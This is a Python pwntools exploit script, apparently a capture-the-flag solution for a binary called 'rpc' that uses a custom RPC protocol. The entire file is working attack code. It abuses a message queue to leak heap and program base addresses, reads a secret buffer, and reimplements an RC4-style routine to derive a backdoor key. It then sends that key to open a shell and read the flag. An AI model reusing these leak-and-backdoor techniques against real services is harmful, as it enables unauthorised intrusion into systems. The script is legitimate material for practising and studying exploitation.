#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './rpc'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *$rebase(0x213D)
    b *$rebase(0x22F4)
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass


def reverse_int(value): return p32(value, endian = 'big')
def reverse_size_t(value): return p64(value, endian = 'big')
        
# pause()
# login
sh.send('RPCM')
sh.send(reverse_int(0))
sh.send(reverse_int(1))

sh.recvuntil('\xbe\xf2')
uuid = sh.recvn(u32(sh.recvn(4), endian = 'big'))
log.success('uuid: ' + (uuid))

# malloc
packet = reverse_int(0x2) + reverse_int(0) + reverse_int(0x8) + 'a' * 8
sh.send('RPCM')
sh.send(reverse_int(32))
sh.send(reverse_int(5))
sh.send(packet)
sh.recvuntil('\xbe\xef')

# add into message queue
sh.send('RPCM')
sh.send(reverse_int(8 + len(uuid) + 28))
sh.send(reverse_int(5))
packet = reverse_int(0x3) + reverse_int(len(uuid)) + uuid + reverse_int(0x8) + 'b' * 8 +reverse_int(0)
sh.send(packet)
sh.recvuntil('\xbe\xef')

# leak
sh.send('RPCM')
sh.send(reverse_int(8 + len(uuid) + 20))
sh.send(reverse_int(2))
packet = reverse_int(len(uuid)) + uuid + reverse_int(0x8) + 'b' * 8
sh.send(packet)
sh.recvuntil('\xbe\xf2')
result = sh.recvn(u32(sh.recvn(4), endian = 'big'))
heap_addr = int(result, 10) - 0x12c90
log.success('heap_addr: ' + hex(heap_addr))


def leak(addr):
    # set ptr
    sh.send('RPCM')
    sh.send(reverse_int(28))
    sh.send(reverse_int(5))
    packet = reverse_int(4) + reverse_int(0) + reverse_size_t(addr)
    sh.send(packet)
    sh.recvuntil('\xbe\xef')

    # add into message queue
    sh.send('RPCM')
    sh.send(reverse_int(8 + len(uuid) + 28))
    sh.send(reverse_int(5))
    packet = reverse_int(0x1) + reverse_int(len(uuid)) + uuid + reverse_int(0x8) + 'c' * 8 +reverse_int(0)
    sh.send(packet)
    sh.recvuntil('\xbe\xef')

    # leak
    sh.send('RPCM')
    sh.send(reverse_int(8 + len(uuid) + 20))
    sh.send(reverse_int(2))
    packet = reverse_int(len(uuid)) + uuid + reverse_int(0x8) + 'c' * 8
    sh.send(packet)
    sh.recvuntil('\xbe\xf2')
    return sh.recvn(u32(sh.recvn(4), endian = 'big'))

result = leak(heap_addr + 0x11e70)
image_base_addr = u64(result.ljust(8, '\0')) - 0x20cc58
log.success('image_base_addr: ' + hex(image_base_addr))
random_buf_addr = image_base_addr + 0x20D180
log.info('random_buf_addr: ' + hex(random_buf_addr))

random_buf = leak(random_buf_addr) + leak(random_buf_addr + 8)

def sub_1E02(arg_buf):
    import ctypes
    out = [v for v in range(256)]
    temp_buf = [ord(v) for v in arg_buf] * 0x10
    v6 = 0
    for j in range(256):
        v6 = (v6 + out[j] + temp_buf[j]) & 0xff
        v3 = out[j]
        out[j] = out[v6]
        out[v6] = v3

    return out

def sub_1FA0(arg_1):
    patched_key = [0xFB, 0x60, 0xBB, 0x8C, 0x67, 0x76, 0x19, 0xB6, 0xAE, 0x9B, 0x17, 0x7C, 0xB1, 0x3D, 0xBB, 0x80,
                    0x26, 0xF0, 0x0E, 0x9F, 0x04, 0xD2, 0xC6, 0x5D, 0xFE, 0x79, 0x2F, 0xCE, 0x28, 0xA7, 0xFF, 0xE0,
                    0xC2, 0xBB, 0xC5, 0xF2]
    v5 = 0
    v6 = 0
    out = []

    for i in range(0x24):
        v5 = (v5 + 1) & 0xff
        v6 = (arg_1[v5] + v6) & 0xff
        v3 = arg_1[v5]
        arg_1[v5] = arg_1[v6]
        arg_1[v6] = v3
        out += [arg_1[(arg_1[v5] + arg_1[v6]) & 0xff] ^ patched_key[i]]

    out = [chr(v) for v in out]
    return ''.join(out)

result = sub_1E02(random_buf)
key = sub_1FA0(result)

# backdoor
sh.send('RPCM')
sh.send(reverse_int(0))
sh.send(reverse_int(6))
sh.send(reverse_int(0x24))
sh.send(key)
sh.send(reverse_int(0x16))
sh.sendline('cat flag')

sh.interactive()
clear()